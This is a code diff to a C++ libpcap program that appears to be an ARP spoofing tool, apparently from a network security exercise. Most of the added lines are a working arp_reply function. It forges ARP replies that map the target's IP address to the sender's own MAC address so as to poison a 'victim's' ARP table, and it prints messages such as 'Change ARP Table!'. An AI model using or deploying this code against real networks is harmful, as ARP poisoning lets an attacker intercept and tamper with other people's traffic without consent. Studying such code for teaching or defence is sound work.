@@ -53,7 +53,7 @@ void info_network::print_status()
         printf("%02X",(sender_MACaddr[i]));
     cout << endl;
     cout << "target_ip       : " << target_IP << endl;
-    cout << "\033[1;32m===========================================\033[0m\n";
+    cout << "\033[1;32m===========================================\033[0m" << endl;
 }
 
 // arp_packet
@@ -67,6 +67,7 @@ void arp_packet::arp_request()
     unsigned char packet[1514];
     pcap_t *handle;
 
+    cout << "[+] ARP_Request(BroadCast)... then get victim's MAC address!" << endl;
     handle = pcap_open_live(this->interface, BUFSIZ, 1, 1000, this->errbuf);
     Ethernet_H* eth_h = (Ethernet_H *)packet;
     memcpy(eth_h->dest, "\xff\xff\xff\xff\xff\xff", 6);
@@ -84,7 +85,6 @@ void arp_packet::arp_request()
     *(uint16_t *)arp_h->sender_IP = my_IPaddr;
     *(uint16_t *)arp_h->target_IP = inet_addr(sender_IP);
 
-    cout << "[+] ARP_Request(BroadCast)... then get victim's MAC address!" << endl;
     pcap_sendpacket(handle, packet, sizeof(Ethernet_H)+sizeof(Arp_H));
     cout << "[+] ARP_Request is done." << endl;
 }
@@ -92,10 +92,6 @@ void arp_packet::arp_request()
 void arp_packet::arp_capture()
 {
     pcap_t *handle;         /* Session handle */
-    struct bpf_program fp;      /* The compiled filter */
-    char filter_exp[] = "port 80";  /* The filter expression */
-    bpf_u_int32 mask;       /* Our netmask */
-    bpf_u_int32 net;        /* Our IP */
     struct pcap_pkthdr *header; /* The header that pcap gives us */
     const u_char *packet;       /* The actual packet */
     int res;
@@ -128,4 +124,31 @@ void arp_packet::arp_capture()
     pcap_close(handle);
 }
 
+void arp_packet::arp_reply()
+{
+    unsigned char packet[1514];
+    pcap_t *handle;
 
+    cout << "[+] ARP_REPLY... Change ARP Table!" << endl;
+    handle = pcap_open_live(this->interface, BUFSIZ, 1, 1000, this->errbuf);
+
+    Ethernet_H* eth_h = (Ethernet_H *)packet;
+    memcpy(eth_h->dest, sender_MACaddr, 6);
+    memcpy(eth_h->src, my_MACaddr, 6);
+    eth_h->type = ntohs(ETHERTYPE_ARP);
+
+    Arp_H* arp_h = (Arp_H *)(packet+sizeof(Ethernet_H));
+    arp_h->h_type = htons(1);
+    arp_h->p_type = htons(ETHERTYPE_IP);
+    arp_h->h_len = 6;
+    arp_h->p_len = 4;
+    arp_h->oper = ntohs(ARP_REPLY);
+    memcpy(arp_h->sender_MAC, my_MACaddr, 6);
+    memcpy(arp_h->target_MAC, sender_MACaddr, 6) ;
+    *(uint16_t *)arp_h->sender_IP = inet_addr(target_IP);
+    *(uint16_t *)arp_h->target_IP = inet_addr(sender_IP);
+
+    pcap_sendpacket(handle, packet, sizeof(Ethernet_H)+sizeof(Arp_H));
+    cout << "[+] ARP_REPLY is done." << endl;
+    cout << "\033[1;32m[+] Done! Check it now!\033[0m" << endl;
+}
